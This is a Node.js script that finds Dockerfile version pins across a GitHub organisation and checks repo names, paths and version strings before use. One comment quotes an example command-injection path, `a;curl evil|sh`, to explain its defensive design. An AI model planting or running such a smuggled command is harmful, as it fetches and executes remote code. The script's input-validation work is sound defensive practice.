#!/usr/bin/env node
// discover.js - finds every ARG <TOOL>_VERSION pin across the org's Dockerfiles.
//
// Replaces a hand-written inventory. That inventory was already stale 24h after
// it was written: it declared 12 pins while the org had 20, and three of the
// eight it missed were still on the vulnerable tofu 1.10.10.
//
// Only the ceilings stay declared, in pins.yml - which version of Kubernetes we
// stop supporting is policy, and no tool can infer it.
const { execSync, execFileSync } = require('child_process');
const fs = require('fs');

const sh = (c) => execSync(c, { encoding: 'utf8', maxBuffer: 32 * 1024 * 1024 }).trim();
const yaml = (f) => JSON.parse(sh(`python3 -c "import yaml,json;print(json.dumps(yaml.safe_load(open('${f}'))))"`));

// Repo names and file paths come from the code-search API - from whatever anyone
// with write access named a file. `a;curl evil|sh` is a legal git path, so these
// never reach a shell string: execFileSync passes argv with no shell in between.
const ghArgs = (...a) => execFileSync('gh', a, { encoding: 'utf8', maxBuffer: 32 * 1024 * 1024 }).trim();
// Belt and braces: reject anything that is not a plain repo name / path anyway.
const SAFE_REPO = /^[A-Za-z0-9._-]{1,100}$/;
const SAFE_PATH = /^[A-Za-z0-9._\/-]{1,255}$/;

const cfg = yaml(process.argv[2] || '.github/vuln-bump/pins.yml');
const known = cfg.tools || {};

// Code search is the only way to find these without cloning every repo.
const hits = JSON.parse(ghArgs(
  'api', '-X', 'GET', 'search/code',
  '-f', 'q="ARG" "_VERSION=" org:nullplatform filename:Dockerfile',
  '-f', 'per_page=100',
  '--jq', '[.items[] | {repo: .repository.name, path: .path}]'));

const seen = new Set(), pins = [];
for (const h of hits) {
  const key = `${h.repo}|${h.path}`;
  if (seen.has(key)) continue;
  seen.add(key);
  if (!SAFE_REPO.test(h.repo) || !SAFE_PATH.test(h.path)) {
    console.log(`  SKIPPED (unsafe name): ${h.repo}/${h.path}`);
    continue;
  }
  let body;
  try {
    body = Buffer.from(JSON.parse(
      ghArgs('api', `repos/nullplatform/${h.repo}/contents/${h.path}`)).content, 'base64').toString();
  } catch { continue; }

  for (const line of body.split('\n')) {
    const m = line.match(/^ARG ([A-Z_]+)_VERSION=(.*)$/);
    if (!m) continue;
    const [, name, raw] = m;
    const tool = known[name];
    // An unmapped ARG is reported, not guessed: TOFU_VERSION means opentofu only
    // because pins.yml says so. Guessing would have the bot edit pins nobody mapped.
    if (!tool) { pins.push({ repo: h.repo, path: h.path, arg: `${name}_VERSION`, status: 'UNMAPPED', current: raw.trim() }); continue; }
    if (!raw.trim()) { pins.push({ repo: h.repo, path: h.path, arg: `${name}_VERSION`, tool, status: 'NO_DEFAULT' }); continue; }
    // The ARG value is repo content too. It later reaches resolve.js as an
    // argument, so anything that is not version-shaped is reported, not passed on.
    const val = raw.trim();
    if (!/^v?[0-9]+(\.[0-9]+){0,2}$/.test(val)) {
      pins.push({ repo: h.repo, path: h.path, arg: `${name}_VERSION`, tool, status: 'UNPARSEABLE', current: val.slice(0, 40) });
      continue;
    }
    pins.push({
      repo: h.repo, path: h.path, arg: `${name}_VERSION`, tool,
      prefix: val.startsWith('v') ? 'v' : '',
      current: val,
    });
  }
}

pins.sort((a, b) => (a.repo + a.path + a.arg).localeCompare(b.repo + b.path + b.arg));
fs.writeFileSync('discovered.json', JSON.stringify(pins, null, 2));

const ok = pins.filter(p => !p.status);
console.log(`Discovered ${pins.length} pins across ${new Set(pins.map(p => p.repo)).size} repos (${ok.length} mapped)`);
for (const p of pins.filter(p => p.status)) console.log(`  ${p.status}: ${p.repo}/${p.path} ${p.arg}`);
